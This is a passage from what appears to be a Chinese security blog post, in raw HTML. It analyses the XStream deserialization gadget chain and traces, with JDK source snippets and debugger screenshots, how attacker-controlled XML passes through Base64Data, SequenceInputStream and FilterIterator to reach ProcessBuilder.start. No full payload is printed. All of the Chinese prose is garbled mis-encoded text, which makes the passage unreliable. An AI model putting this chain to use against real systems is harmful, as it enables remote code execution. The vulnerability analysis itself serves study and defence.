<code>&lt;jdk.nashorn.internal.objects.NativeString&gt;</code>ã€<code>&lt;string&gt;test&lt;/string&gt;</code> è¯¥é”®å€¼å¯¹åˆ©ç”¨ <code>HashMap()</code> è·å–å…¶ <code>hash</code> å€¼ï¼Œç„¶åå†è¿›è¡Œåºåˆ—åŒ–</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">18</span>), <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818161935225.png" data-caption="image-20230818161935225"><img src="/../images/Java/deserialization/image-20230818161935225.png" alt="image-20230818161935225"></a></p><blockquote><p>å…·ä½“å¼€å±•åˆ†æ</p></blockquote><p>åˆ†æå…¶åˆ©ç”¨é“¾ï¼ˆGadgetsï¼‰ï¼Œé€šè¿‡ <code>Poc</code> å¯å‘ç°ï¼Œå…¶æœ€åæ‰§è¡Œå‘½ä»¤ä½¿ç”¨äº† <code>java.lang.ProcessBuilder</code> ç±»ä¸­çš„ <code>start()</code> æ–¹æ³•ï¼Œç°æˆ‘ä»¬è·Ÿè¿›ç±»ä¸­çš„ <code>start()</code> è·å–æ•´ä¸ªåˆ©ç”¨é“¾</p><p><em>æ³¨é‡Šï¼š<code>java.lang.ProcessBuilder</code> æ˜¯ Java æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªç±»ï¼Œç”¨äºåˆ›å»ºå’Œç®¡ç†å¤–éƒ¨è¿›ç¨‹ã€‚å®ƒæä¾›äº†ä¸€ç§åœ¨ Java ç¨‹åºä¸­æ‰§è¡Œå¤–éƒ¨å‘½ä»¤çš„æ–¹å¼ï¼Œé€šè¿‡<code>java.lang.ProcessBuilder</code>  å¯ä»¥æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤åŠå…¶å‚æ•°ï¼Œå¹¶è®¾ç½®æ‰§è¡Œå‘½ä»¤æ—¶çš„ç¯å¢ƒå˜é‡ã€å·¥ä½œç›®å½•ç­‰ã€‚ç„¶åä½¿ç”¨ <code>start()</code> æ–¹æ³•æ¥å¯åŠ¨è¿›ç¨‹ï¼Œå¹¶è·å–ä¸è¯¥è¿›ç¨‹ç›¸å…³çš„è¾“å…¥æµã€è¾“å‡ºæµå’Œé”™è¯¯æµã€‚</em></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819150846588.png" data-caption="image-20230819150846588"><img src="/../images/Java/deserialization/image-20230819150846588.png" alt="image-20230819150846588"></a></p><p>å› ä¸º <code>xstreaam</code> ä¸­å·²ç»åŒ…å«äº† <code>java.lang.ProcessBuilder</code> ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä»£ç ä¸­å¹¶ä¸éœ€è¦å¯¼å…¥ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å…ˆå¯¼å…¥æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œåˆ†æï¼Œè·Ÿè¿›å…¶ä»£ç ä¾¿äºæ‰¾åˆ° <code>start()</code> æ–¹æ³•</p><p>ç°å¯¼å…¥ <code>import java.lang.ProcessBuilder;</code> ç„¶åå°†<code>é¼ æ ‡ç§»è‡³ ProcessBuilder + é¼ æ ‡å·¦é”®</code>ï¼Œè¿›å…¥ <code>ProcessBuilder</code> ç±»</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144037081.png" data-caption="image-20230817144037081"><img src="/../images/Java/deserialization/image-20230817144037081.png" alt="image-20230817144037081"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144218001.png" data-caption="image-20230817144218001"><img src="/../images/Java/deserialization/image-20230817144218001.png" alt="image-20230817144218001"></a></p><p>è¿›å…¥åˆ° <code>ProcessBuilder</code> ç±»åï¼Œç»§ç»­å¯»æ‰¾ <code>start()</code> æ–¹æ³•ï¼Œé¼ æ ‡é€‰ä¸­ <code>ProcessBuilder</code> åï¼Œé¼ æ ‡ç§»è‡³åœç•™ï¼Œå¼¹å‡ºè¯¥ç±»çš„å…·ä½“æè¿°ï¼Œç®€å•çš„æ„æ€æ˜¯ï¼š<code>java.lang.ProcessBuilder</code> æ˜¯ Java æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªç±»ï¼Œç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ã€‚æ¯ä¸ª <code>ProcessBuilder</code> å®ä¾‹ç®¡ç†ä¸€ç»„è¿›ç¨‹å±æ€§ã€‚<code>start()</code> æ–¹æ³•ä½¿ç”¨è¿™äº›å±æ€§åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>Process</code> å®ä¾‹ã€‚å¯ä»¥ä»åŒä¸€ä¸ª <code>ProcessBuilder</code> å®ä¾‹é‡å¤è°ƒç”¨ <code>start()</code> æ–¹æ³•ï¼Œä»¥åˆ›å»ºå…·æœ‰ç›¸åŒæˆ–ç›¸å…³å±æ€§çš„æ–°å­è¿›ç¨‹ã€‚å…·ä½“å¯è‡ªè¡Œç¿»è¯‘æŸ¥çœ‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817144435568.png" data-caption="image-20230817144435568"><img src="/../images/Java/deserialization/image-20230817144435568.png" alt="image-20230817144435568"></a></p><p>æ¥ç€æˆ‘ä»¬ç‚¹å‡»å›¾ä¸­çš„ <code>start()</code> æ–¹æ³•è¿›å…¥åˆ° <code>start()</code> æ–¹æ³•çš„å…·ä½“æè¿°ï¼Œæœ€åé€šè¿‡ <code>é¼ æ ‡å³é”®</code> è¯¥æè¿° <code>Jump to Source</code> è¿›å…¥åˆ° <code>java.lang.ProcessBuilder#start()</code> æ–¹æ³•ä¸­ </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145146400.png" data-caption="image-20230817145146400"><img src="/../images/Java/deserialization/image-20230817145146400.png" alt="image-20230817145146400"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145324226.png" data-caption="image-20230817145324226"><img src="/../images/Java/deserialization/image-20230817145324226.png" alt="image-20230817145324226"></a></p><p>é€šè¿‡ <code>Poc</code> å¯çŸ¥æœ€åæ‰§è¡Œçš„æ˜¯ç”± <code>java.lang.ProcessBuilder</code> ç±»ä¸‹çš„ <code>command</code> å¯¹è±¡è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æ–­ç‚¹å¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817145652475.png" data-caption="image-20230817145652475"><img src="/../images/Java/deserialization/image-20230817145652475.png" alt="image-20230817145652475"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817150416568.png" data-caption="image-20230817150416568"><img src="/../images/Java/deserialization/image-20230817150416568.png" alt="image-20230817150416568"></a></p><p>è¿”å› <code>XStreamExample.java</code> æ–‡ä»¶ä¸­è¿è¡Œ <code>debug</code> ï¼Œé¼ æ ‡å³é”®ç‚¹å‡» Debug æŒ‰é’®ï¼Œè·å¾—è¯¥ä»£ç çš„å®Œæ•´åˆ©ç”¨é“¾</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817150621674.png" data-caption="image-20230817150621674"><img src="/../images/Java/deserialization/image-20230817150621674.png" alt="image-20230817150621674"></a></p><p>å®Œæ•´åˆ©ç”¨é“¾ï¼ˆGadgetsï¼‰å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817154237775.png" data-caption="image-20230817154237775"><img src="/../images/Java/deserialization/image-20230817154237775.png" alt="image-20230817154237775"></a></p><p>çŸ¥é“å®Œæ•´è°ƒç”¨é“¾ï¼Œç°å›åˆ° <code>XStreamExample.java</code> å¯¹ <code>xstream.fromXML()</code> æ–¹æ³•è¿›è¡Œ <code>debug</code> ï¼Œé€ä¸€è¿›è¡Œè°ƒè¯•åˆ†æï¼Œé€šè¿‡ä¸æ–­çš„ç‚¹ç‚¹ç‚¹ç‚¹ï¼Œå‘ç°è°ƒç”¨é“¾å®åœ¨å¤ªé•¿ï¼Œæœ€ç»ˆè¿˜æ˜¯é€šè¿‡ä¸Šé¢åˆ†æå‡ºæ¥çš„ <code>Gadgets</code> ç›´æ¥ç›´æ¥å®šä½æ¼æ´ç‚¹</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818191523527.png" data-caption="image-20230818191523527"><img src="/../images/Java/deserialization/image-20230818191523527.png" alt="image-20230818191523527"></a></p><p>å›åˆ° <code>ProcessBuilder.java</code> æ–‡ä»¶ä¸‹æ‰“ä¸‹æ–­ç‚¹ï¼Œé‡æ–°è·å–å®Œæ•´çš„ <code>Gadgets</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818192007754.png" data-caption="image-20230818192007754"><img src="/../images/Java/deserialization/image-20230818192007754.png" alt="image-20230818192007754"></a></p><p>ç„¶åæ ¹æ®ä¸Šé¢åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“ <code>XStream</code> åœ¨è¿›è¡Œåºåˆ—åŒ–å‰ï¼Œéœ€è¦å…ˆå°†å€¼åˆ©ç”¨ <code>HashMap()</code> ç”Ÿæˆ <code>hash</code> ç„¶å <code>put</code> åˆ° <code>entry</code> ä¸­ï¼Œæ ¹æ® <code>Poc</code> åŠ <code>HashMap()</code> å…³é”®å­—ï¼Œæˆ‘ä»¬å®šä½åˆ° </p><p>è°ƒç”¨é“¾ <code>putCurrentEntryIntoMap:107,MapCoverter(com.thoughtworks.xstream.converters.collections)</code> </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818195409950.png" data-caption="image-20230818195409950"><img src="/../images/Java/deserialization/image-20230818195409950.png" alt="image-20230818195409950"></a></p><p>æ ¹æ®è°ƒç”¨é“¾å‘ä¸Šåˆ†æï¼Œæ‰¾åˆ°è·å– <code>hash</code> å€¼çš„ä»£ç ï¼Œè°ƒç”¨äº† <code>getStringValue()</code> æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818201645103.png" data-caption="image-20230818201645103"><img src="/../images/Java/deserialization/image-20230818201645103.png" alt="image-20230818201645103"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818200313210.png" data-caption="image-20230818200313210"><img src="/../images/Java/deserialization/image-20230818200313210.png" alt="image-20230818200313210"></a></p><p>è·Ÿè¿› <code>getStringValue()</code> ï¼Œ <code>Ctrl + é¼ æ ‡å·¦é”®</code>ï¼Œå…·ä½“ <code>getStringValue()</code> æ–¹æ³•å¦‚ä¸‹ï¼Œä»£ç å¤§æ¦‚æ„æ€æ˜¯é€šè¿‡ <code>instanceof</code> è¿ç®—ç¬¦æ£€æŸ¥ <code>this.value</code> è¿™ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ï¼ˆStringï¼‰ç±»å‹ï¼Œè‹¥è¡¨è¾¾å¼ <code>this.value instanceof String</code> ä¸º <code>true</code> åˆ™å°† <code>this.value</code> è¿™ä¸ªå¯¹è±¡å¼ºåˆ¶è½¬æ¢ä¸º <code>String</code> ç±»å‹å¹¶è¿”å›ï¼Œè‹¥ä¸æ˜¯ <code>String</code> ç±»å‹åˆ™è°ƒç”¨<code>this.value.toString()</code> å°† <code>this.value</code> è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶è¿”å›</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818200807155.png" data-caption="image-20230818200807155"><img src="/../images/Java/deserialization/image-20230818200807155.png" alt="image-20230818200807155"></a></p><p>æ ¹æ®è°ƒç”¨é“¾å»åˆ° <code>getStringValue()</code> , ç”±ä¸‹å›¾å¾—çŸ¥ï¼Œ<code>this.value</code> çš„å€¼ä¸º <code>&#123;Base64Date@1473&#125;</code> å…¶ä¸­ Base64@Date ä¸ºå¯¹è±¡çš„ç±»åï¼Œ1473æ˜¯å¯¹è±¡çš„å“ˆå¸Œç </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202004137.png" data-caption="image-20230818202004137"><img src="/../images/Java/deserialization/image-20230818202004137.png" alt="image-20230818202004137"></a></p><p>ç”± Poc å¯çŸ¥ï¼Œ<code>this.value</code> çš„å€¼ä¸º <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> ç±»ï¼Œç”±äºæ”»å‡»è€…å¯é€šè¿‡ <code>xml</code> æ§åˆ¶ <code>NativeString</code> å…ƒç´ çš„ <code>value</code> å­å…ƒç´ ï¼Œæ„é€ äº†æ”»å‡»ï¼Œå®˜æ–¹æ„å»ºä¸º <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> ç±»</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202344501.png" data-caption="image-20230818202344501"><img src="/../images/Java/deserialization/image-20230818202344501.png" alt="image-20230818202344501"></a></p><p>å½“ <code>this.value</code> ä¸º <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> æ—¶ï¼Œç¨‹åºè°ƒç”¨ Base64Data ç±»çš„ <code>toString</code> æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202759615.png" data-caption="image-20230818202759615"><img src="/../images/Java/deserialization/image-20230818202759615.png" alt="image-20230818202759615"></a></p><p><code> Ctrl + é¼ æ ‡å·¦é”®</code> è·Ÿè¿›<code>toString()</code> æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230818202847844.png" data-caption="image-20230818202847844"><img src="/../images/Java/deserialization/image-20230818202847844.png" alt="image-20230818202847844"></a></p><p>åœ¨ InputStream is ä¸Šæ‰“ä¸Šæ–­ç‚¹ï¼Œç„¶åé‡æ–° debug </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819121943027.png" data-caption="image-20230819121943027"><img src="/../images/Java/deserialization/image-20230819121943027.png" alt="image-20230819121943027"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•è¿”å›ç±»å‹ä¸ºbyte[]ï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•å°†è¿”å›ä¸€ä¸ªå­—èŠ‚æ•°ç»„</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] get() &#123;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥æˆå‘˜å˜é‡this.dataæ˜¯å¦ä¸ºnull</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.data == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºä¸€ä¸ªByteArrayOutputStreamExå¯¹è±¡baosï¼Œå¹¶æŒ‡å®šåˆå§‹å®¹é‡ä¸º1024å­—èŠ‚</span></span><br><span class="line">            <span class="type">ByteArrayOutputStreamEx</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStreamEx</span>(<span class="number">1024</span>);</span><br><span class="line">            <span class="comment">// ä»this.dataHandler.getDataSource().getInputStream()è·å–è¾“å…¥æµis</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="built_in">this</span>.dataHandler.getDataSource().getInputStream();</span><br><span class="line">            <span class="comment">// ä½¿ç”¨baos.readFrom(is)å°†è¾“å…¥æµçš„å†…å®¹è¯»å–åˆ°baosä¸­</span></span><br><span class="line">            baos.readFrom(is);</span><br><span class="line">            <span class="comment">// å…³é—­è¾“å…¥æµis</span></span><br><span class="line">            is.close();</span><br><span class="line">            <span class="comment">// å°†baos.getBuffer()è¿”å›çš„å†…éƒ¨å­—èŠ‚æ•°ç»„èµ‹å€¼ç»™this.data</span></span><br><span class="line">            <span class="built_in">this</span>.data = baos.getBuffer();</span><br><span class="line">            <span class="comment">// å°†baos.size()è¿”å›çš„å­—èŠ‚æ•°èµ‹å€¼ç»™this.dataLen</span></span><br><span class="line">            <span class="built_in">this</span>.dataLen = baos.size();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="comment">// åœ¨æ‰§è¡Œä¸Šè¿°æ“ä½œçš„è¿‡ç¨‹ä¸­å‘ç”ŸIOExceptionå¼‚å¸¸ï¼Œåˆ™å°†this.dataLenè®¾ç½®ä¸º0</span></span><br><span class="line">            <span class="built_in">this</span>.dataLen = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>ä»£ç å¤§æ„å¦‚ä¸‹ï¼Œç”± Poc å’Œä¸Šå›¾å¯çŸ¥ï¼Œè¿™ä¸€ç¨‹åºæ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1ã€<code>this.dataHandler.getDataSource()</code>  æ˜¯è·å– <code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</code> ç±»ä¸­çš„ <code>dataHandler</code> å±æ€§çš„<code>DataSource</code> å€¼ï¼Œè€Œ   poc ä¸­ DateSource è®¾ç½®çš„æ˜¯ <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code> ç±»ï¼Œæ‰€ä»¥ <code>this.dataHandler.getDataSource()</code> ä¸º <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819123639794.png" data-caption="image-20230819123639794"><img src="/../images/Java/deserialization/image-20230819123639794.png" alt="image-20230819123639794"></a></p><p>2ã€ç„¶åç¨‹åºç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œé€šè¿‡ <code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code> ç±»çš„ <code>getInputStream</code> æ–¹æ³•ï¼Œè·å–<code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc</code> çš„ is å±æ€§å€¼</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819123847457.png" data-caption="image-20230819123847457"><img src="/../images/Java/deserialization/image-20230819123847457.png" alt="image-20230819123847457"></a></p><p>ç»§ç»­è·Ÿè¸ªï¼Œæˆ‘ä»¬ç”±ä¸Šå›¾å¯çŸ¥ï¼Œ is ä¸­è®¾ç½®çš„å€¼ä¸º <code>java.io.SequenceInputStream</code> ç±»ï¼Œæˆ‘ä»¬éœ€è¦è·Ÿè¿›è¯¥ç±»ï¼Œè°ƒç”¨çš„æ˜¯ è¯¥ç±»çš„ <code>nextStream()</code> æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819124515348.png" data-caption="image-20230819124515348"><img src="/../images/Java/deserialization/image-20230819124515348.png" alt="image-20230819124515348"></a></p><p><code>Ctrl + é¼ æ ‡å·¦é”®</code> è·Ÿè¿›ä»£ç  </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nextStream()æ–¹æ³•è¢«å£°æ˜ä¸ºfinalï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•ä¸èƒ½è¢«ç»§æ‰¿ç±»é‡å†™ã€‚æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ï¼Œä½¿ç”¨voidè¡¨ç¤º</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">nextStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥æˆå‘˜å˜é‡inæ˜¯å¦ä¸ºnull,å¦‚æœinä¸ä¸ºnullï¼Œåˆ™è°ƒç”¨in.close()å…³é—­å½“å‰çš„è¾“å…¥æµ</span></span><br><span class="line">    <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// å¦‚æœè¿­ä»£å™¨eæœ‰ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™è°ƒç”¨e.nextElement()è·å–ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸º InputStream ç±»å‹ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™in</span></span><br><span class="line">    <span class="keyword">if</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        in = (InputStream) e.nextElement();</span><br><span class="line">        <span class="comment">// å¦‚æœinä¸ºnullï¼Œåˆ™æŠ›å‡ºNullPointerExceptionå¼‚å¸¸ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> (in == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¦‚æœè¿­ä»£å™¨eæ²¡æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™å°†inèµ‹å€¼ä¸ºnull</span></span><br><span class="line">    <span class="keyword">else</span> in = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819124734273.png" data-caption="image-20230819124734273"><img src="/../images/Java/deserialization/image-20230819124734273.png" alt="image-20230819124734273"></a></p><p>ç”± Poc å¯çŸ¥ï¼Œis ä¸‹çš„ e å…ƒç´ çš„å€¼è¢«è®¾ç½®ä¸º <code>javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819125255722.png" data-caption="image-20230819125255722"><img src="/../images/Java/deserialization/image-20230819125255722.png" alt="image-20230819125255722"></a></p><p>ç»§ç»­æ ¹æ®è°ƒç”¨é“¾è·Ÿè¿›  <code>javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator</code>ï¼Œå…¶è°ƒç”¨äº†è¯¥ç±»çš„ nextElement() æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819125438579.png" data-caption="image-20230819125438579"><img src="/../images/Java/deserialization/image-20230819125438579.png" alt="image-20230819125438579"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿”å›ç±»å‹ä¸ºObjectï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•å°†è¿”å›ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">nextElement</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">        <span class="comment">// å½“typeçš„å€¼ä¸ºKEYSæ—¶ï¼Œè°ƒç”¨iterator.next()è·å–è¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œè°ƒç”¨è·å–åˆ°çš„å…ƒç´ çš„getKey()æ–¹æ³•ï¼Œè¿”å›å…ƒç´ çš„é”®</span></span><br><span class="line">        <span class="keyword">case</span> KEYS: <span class="keyword">return</span> iterator.next().getKey();</span><br><span class="line">        <span class="comment">// å½“typeçš„å€¼ä¸ºELEMENTSæ—¶ï¼Œè°ƒç”¨iterator.next()è·å–è¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œè°ƒç”¨è·å–åˆ°çš„å…ƒç´ çš„getValue()æ–¹æ³•ï¼Œè¿”å›å…ƒç´ çš„å€¼</span></span><br><span class="line">        <span class="keyword">case</span> ELEMENTS: <span class="keyword">return</span> iterator.next().getValue();</span><br><span class="line">        <span class="comment">// å¦‚æœtypeçš„å€¼ä¸æ˜¯KEYSä¹Ÿä¸æ˜¯ELEMENTSï¼Œå³æ²¡æœ‰åŒ¹é…çš„caseï¼Œåˆ™æ‰§è¡Œdefaultä»£ç å—ï¼Œè¿”å›null</span></span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç”± poc å¯çŸ¥ï¼Œtype  å€¼ä¸º KEYï¼Œåˆ™è·å– iterator ä¸‹çš„å…ƒç´ </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130132192.png" data-caption="image-20230819130132192"><img src="/../images/Java/deserialization/image-20230819130132192.png" alt="image-20230819130132192"></a></p><p>ç»§ç»­è·Ÿè¿›<code> &lt;iterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</code>  ä¸­çš„ <code>javax.imageio.spi.FilterIterator</code> ç±»ï¼Œè°ƒç”¨çš„æ˜¯è¯¥ç±»çš„ advance() æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130431252.png" data-caption="image-20230819130431252"><img src="/../images/Java/deserialization/image-20230819130431252.png" alt="image-20230819130431252"></a></p><p><code>Ctrl + é¼ æ ‡å·¦é”®</code> , è·Ÿè¿›ä»£ç </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819130613686.png" data-caption="image-20230819130613686"><img src="/../images/Java/deserialization/image-20230819130613686.png" alt="image-20230819130613686"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// advance()æ–¹æ³•æ˜¯ä¸€ä¸ªç§æœ‰æ–¹æ³•ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œä½¿ç”¨voidè¡¨ç¤º</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">advance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// åœ¨å¾ªç¯ä¸­ï¼Œé€šè¿‡iter.next()è·å–è¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™æ³›å‹ç±»å‹Tçš„å˜é‡elt</span></span><br><span class="line">    <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">elt</span> <span class="operator">=</span> iter.next();</span><br><span class="line">        <span class="comment">// å¦‚æœæ»¡è¶³è¿‡æ»¤æ¡ä»¶ï¼Œå°†eltèµ‹å€¼ç»™å˜é‡nextï¼Œè¡¨ç¤ºæ‰¾åˆ°äº†ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶ä½¿ç”¨returnè¯­å¥æå‰ç»“æŸæ–¹æ³•,å¦‚æœä¸æ»¡è¶³è¿‡æ»¤æ¡ä»¶,åˆ™ç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯ï¼Œç»§ç»­æŸ¥æ‰¾ä¸‹ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„å…ƒç´ ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> (filter.filter(elt)) &#123;</span><br><span class="line">            next = elt;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    next = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å†æ¬¡å›åˆ° poc ä¸­ï¼Œå°† iterator å±•å¼€ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›å…ƒç´ ï¼Œå…¶ä¸­ ierator ä¸‹ filter æ˜¯æ§åˆ¶è¿‡æ»¤æ¡ä»¶ </p><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230819142118262.png" data-caption="image-20230819142118262"><img src="/../images/Java/deserialization/image-20230819142118262.png" 